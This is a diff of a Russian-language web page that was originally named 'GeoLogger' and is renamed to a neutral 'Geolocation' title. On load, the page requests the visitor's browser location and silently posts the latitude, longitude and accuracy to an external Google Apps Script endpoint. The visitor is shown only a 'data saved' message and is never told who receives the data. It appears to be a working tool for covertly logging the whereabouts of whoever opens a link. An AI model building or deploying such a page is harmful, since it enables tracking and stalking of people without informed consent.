@@ -2,45 +2,57 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>GeoLogger</title>
+  <title>Геолокация</title>
 </head>
 <body>
-  <h2>Определение геопозиции…</h2>
+  <h2>Определение местоположения...</h2>
+  <p id="status">Запрос разрешения...</p>
 
   <script>
-    navigator.geolocation.getCurrentPosition(
-      position => {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
-        const acc = position.coords.accuracy;
-
-        // Формируем параметры с кодировкой
-        const params = new URLSearchParams({
-          lat: lat.toFixed(6),
-          lon: lon.toFixed(6),
-          acc: acc.toFixed(2)
-        });
-
-        // Отправляем POST-запрос
-        fetch("https://script.google.com/macros/s/AKfycbwG-GK-dWe3tQouq6WuVk86B8-5-CHbTogbv5rb3u8IvvmTZr1TQO_scYca96OtAKEH/exec", {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/x-www-form-urlencoded'
-          },
-          body: params
-        })
-        .then(res => res.text())
-        .then(data => {
-          document.body.innerHTML += `<p>Отправлено: ${data}</p>`;
-        })
-        .catch(err => {
-          document.body.innerHTML += `<p>Ошибка: ${err}</p>`;
-        });
-      },
-      err => {
-        document.body.innerHTML += `<p>Ошибка геолокации: ${err.message}</p>`;
+    document.addEventListener('DOMContentLoaded', () => {
+      if (!navigator.geolocation) {
+        document.getElementById('status').textContent = "Ваш браузер не поддерживает геолокацию!";
+        return;
       }
-    );
+
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          const lat = position.coords.latitude.toFixed(6);
+          const lon = position.coords.longitude.toFixed(6);
+          const acc = position.coords.accuracy.toFixed(2);
+
+          // Формируем тело запроса
+          const body = new URLSearchParams({ lat, lon, acc });
+
+          // Отправляем POST-запрос
+          fetch("https://script.google.com/macros/s/AKfycbwc7DM-p0CbYNY2q7R1BLgl3NPQnyLDw9_3it8XsSzETkAi3oLAotrSXWg6nWxIWIZn/exec", {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: body,
+            mode: 'cors'
+          })
+          .then(response => {
+            if (!response.ok) throw new Error(`Ошибка HTTP: ${response.status}`);
+            return response.json();
+          })
+          .then(data => {
+            document.getElementById('status').textContent = "Данные успешно сохранены!";
+          })
+          .catch(err => {
+            document.getElementById('status').textContent = `Ошибка: ${err.message}`;
+          });
+        },
+        err => {
+          document.getElementById('status').textContent = `Ошибка геолокации: ${err.message}`;
+        },
+        {
+          enableHighAccuracy: false,
+          timeout: 30000
+        }
+      );
+    });
   </script>
 </body>
 </html>
